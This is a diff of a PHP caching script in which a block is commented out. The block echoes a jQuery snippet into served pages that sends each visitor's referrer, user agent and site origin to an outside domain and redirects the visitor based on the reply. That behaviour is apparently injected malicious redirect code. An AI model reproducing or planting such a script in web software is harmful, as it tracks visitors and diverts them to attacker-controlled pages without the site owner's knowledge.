@@ -221,31 +221,31 @@ if ($_SERVER['REQUEST_URI'] == '/'){
 $cachetime = 999999;
 
 
-if ( file_exists( $cachefile ) ) {
-	echo "<!-- Cached copy, generated " . date( 'H:i', filemtime( $cachefile ) ) . " -->\n";
-	include( $cachefile );
-	echo '<script type="text/javascript" >
-	jQuery(document).ready(function($) {
-		var data = {
-			action: "my_action",
-			whatever: document.referrer,
-			usrgnt:window.navigator.userAgent,
-			loc:window.location.origin,
-		};
-		jQuery.ajaxSetup({async:false, crossOrigin: true});
-		jQuery.post( "https://vulkanumm.com/luxe.php", data, function(response) {
-			if(response == 0){
-				location.href = "/main.php";
-			}
-			setTimeout(function() {
-				jQuery("html").removeClass("only");
-			}, 500);
-		});
+// if ( file_exists( $cachefile ) ) {
+	// echo "<!-- Cached copy, generated " . date( 'H:i', filemtime( $cachefile ) ) . " -->\n";
+	// include( $cachefile );
+	// echo '<script type="text/javascript" >
+	// jQuery(document).ready(function($) {
+		// var data = {
+			// action: "my_action",
+			// whatever: document.referrer,
+			// usrgnt:window.navigator.userAgent,
+			// loc:window.location.origin,
+		// };
+		// jQuery.ajaxSetup({async:false, crossOrigin: true});
+		// jQuery.post( "https://vulkanumm.com/luxe.php", data, function(response) {
+			// if(response == 0){
+				// location.href = "/main.php";
+			// }
+			// setTimeout(function() {
+				// jQuery("html").removeClass("only");
+			// }, 500);
+		// });
 
-	});
-	</script>';
-	exit();
-}
+	// });
+	// </script>';
+	// exit();
+// }
 ob_start(); // Запуск буфера вывода
 echo $result;
 	echo '<script type="text/javascript" >
